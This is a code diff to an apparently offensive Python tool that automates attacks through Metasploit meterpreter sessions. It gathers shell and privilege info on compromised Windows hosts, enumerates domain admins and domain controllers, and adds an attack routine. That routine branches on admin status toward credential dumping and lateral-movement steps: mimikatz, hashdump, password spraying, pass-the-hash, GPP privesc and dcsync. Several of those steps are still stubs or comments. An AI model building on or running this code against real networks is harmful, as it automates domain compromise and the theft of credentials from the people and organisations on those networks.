@@ -131,6 +131,7 @@ def is_domain_joined(user_info, domain):
     dom_and_user_split = dom_and_user.split('\\')
     dom = dom_and_user_split[0]
     user = dom_and_user_split[1]
+
     if domain:
         if dom.lower() in domain.lower():
             return True
@@ -149,9 +150,22 @@ def print_shell_data(shell_info, admin_shell, local_admin, sess_num_str):
                               sess_num_str)
     print(msg)
 
+async def check_domain_joined(client, sess_num, shell_info):
+    global NEW_SESS_DATA
+
+    # returns either a string of the domain name or False
+    domain = get_domain(shell_info)
+    if domain:
+        NEW_SESS_DATA[sess_num][b'domain'] = domain.encode()
+
+    domain_joined = is_domain_joined(shell_info[0], domain)
+    if domain_joined == True:
+        NEW_SESS_DATA[sess_num][b'domain_joined'] = b'True'
+    else:
+        NEW_SESS_DATA[sess_num][b'domain_joined'] = b'False'
+
 async def sess_first_check(client, sess_num):
     global NEW_SESS_DATA
-    global DOMAIN_DATA
 
     if b'first_check' not in NEW_SESS_DATA[sess_num]:
         print_good('Gathering shell info...', sess_num)
@@ -168,34 +182,24 @@ async def sess_first_check(client, sess_num):
         # Catch errors
         if type(shell_info) == str:
             NEW_SESS_DATA[sess_num][b'error'] = shell_info.encode()
-            return (client, sess_num)
+            return
 
-        # returns either a string of the domain name or False
-        domain = get_domain(shell_info)
-        if domain:
-            NEW_SESS_DATA[sess_num][b'domain'] = domain.encode()
-
-        domain_joined = is_domain_joined(shell_info[0], domain)
-        if domain_joined == True:
-            NEW_SESS_DATA[sess_num][b'domain_joined'] = b'True'
-        else:
-            NEW_SESS_DATA[sess_num][b'domain_joined'] = b'False'
+        # Check if we're domain joined
+        await check_domain_joined(client, sess_num, shell_info)
 
         admin_shell, local_admin = await is_admin(client, sess_num)
         # Catch errors
         if type(admin_shell) == str:
             NEW_SESS_DATA[sess_num][b'error'] = admin_shell.encode()
-            return (client, sess_num)
+            return
 
         NEW_SESS_DATA[sess_num][b'admin_shell'] = admin_shell
         NEW_SESS_DATA[sess_num][b'local_admin'] = local_admin
 
         print_shell_data(shell_info, admin_shell, local_admin, sess_num_str)
 
-        # Update DOMAIN_DATA
+        # Update DOMAIN_DATA for domain admins and domain controllers
         await get_domain_data(client, sess_num)
-
-        return (client, sess_num)
 
 async def is_admin(client, sess_num):
     cmd = 'run post/windows/gather/win_privs'
@@ -238,7 +242,7 @@ async def get_domain_controllers(client, sess_num):
             DOMAIN_DATA['domain_controllers'].append(dc)
             print_good('Domain controller: '+dc, sess_num)
 
-async def get_domain_admins(client, sess_num):
+async def get_domain_admins(client, sess_num, ran_once):
     global DOMAIN_DATA
 
     print_info('Getting domain admins...', sess_num)
@@ -268,8 +272,13 @@ async def get_domain_admins(client, sess_num):
                 print_good('Domain admin: '+x, sess_num)
                 DOMAIN_DATA['domain_admins'].append(x)
 
+    # If we don't get any DAs from the shell we try one more time
     else:
-        print_bad('No domain admins found', sess_num)
+        if ran_once:
+            print_bad('No domain admins found', sess_num)
+        else:
+            print_bad('No domain admins found, trying one more time', sess_num)
+            await get_domain_admins(client, sess_num, True)
 
 async def get_domain_data(client, sess_num):
     ''' Callback for after we gather all the initial shell data '''
@@ -282,7 +291,7 @@ async def get_domain_data(client, sess_num):
     # If no domain admin list found yet then find them
     if NEW_SESS_DATA[sess_num][b'domain_joined'] == b'True':
         if len(DOMAIN_DATA['domain_admins']) == 0:
-            await get_domain_admins(client, sess_num)
+            await get_domain_admins(client, sess_num, False)
         if len(DOMAIN_DATA['domain_controllers']) == 0:
             await get_domain_controllers(client, sess_num)
 
@@ -300,15 +309,56 @@ def update_session(session, sess_num):
 
     return NEW_SESS_DATA[sess_num]
 
+async def gather_passwords(client, sess_num):
+    #mimikatz
+    #mimikittenz
+    #hashdump
+    pass
+
+async def attack(client, sess_num):
+
+    # Is admin
+    if NEW_SESS_DATA[sess_num][b'admin_shell'] == b'True':
+        # mimikatz, spray, PTH RID 500 
+        await gather_passwords(client, sess_num)
+
+    elif NEW_SESS_DATA[sess_num][b'admin_shell'] == b'False':
+        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'True':
+            # Getsystem > mimikatz, spray, PTH rid 500
+            pass
+        if NEW_SESS_DATA[sess_num][b'local_admin'] == b'False':
+            # Give up
+            pass
+
+    # START ATTACKING! FINALLY!
+    # not domain joined and not admin
+        # fuck it?
+    # not domain joined but admin
+        # mimikatz
+    # domain joined and not admin
+        # GPP privesc
+        # Check for seimpersonate
+        # Check for dcsync
+        # userhunter
+        # spray and pray
+    # domain joined and admin
+        # GPP
+        # userhunter
+        # spray and pray
+
 
 async def attack_with_session(client, session, sess_num):
     ''' Attacks with a session '''
-    global DOMAIN_DATA
-
     update_session(session, sess_num)
 
     # Get and print session info if first time we've checked the session
-    task = asyncio.ensure_future(sess_first_check(client, sess_num))
+    #asyncio.ensure_future(sess_first_check(client, sess_num))
+    task = await sess_first_check(client, sess_num)
+    if task:
+        await asyncio.wait(task)
+
+    await attack(client, sess_num)
+
 
 def get_output(client, cmd, sess_num):
     output = client.call('session.meterpreter_read', [str(sess_num)])
@@ -414,7 +464,7 @@ async def run_session_cmd(client, sess_num, cmd, end_str, timeout=30):
     # b'result' not in res, b'error_message' not in res, just catch everything else as an error
     else:
         print_bad(res[b'result'].decode('utf8'), sess_num)
-        BUSY_SESSIONS.remove(sess_num)
+        NEW_SESS_DATA[sess_num][b'busy'] = b'True'
         return cmd
     
 def get_perm_token(client):
